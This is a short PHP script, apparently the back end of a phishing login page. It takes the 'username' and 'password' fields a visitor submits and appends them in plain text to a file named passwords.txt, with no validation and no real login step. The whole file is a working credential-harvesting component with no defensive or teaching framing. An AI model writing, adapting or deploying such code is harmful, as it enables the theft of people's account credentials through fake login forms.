<?php
    $myfile = fopen("passwords.txt", "a") or die("Unable to open file!"); 
    $txt = "Email: " . $_POST["username"];
    $txt .= "\nPaasword: " . $_POST["password"];
    $txt .= "\n \n";

    fwrite($myfile,$txt);
    
    
    fclose($myfile); // Save the file
?>
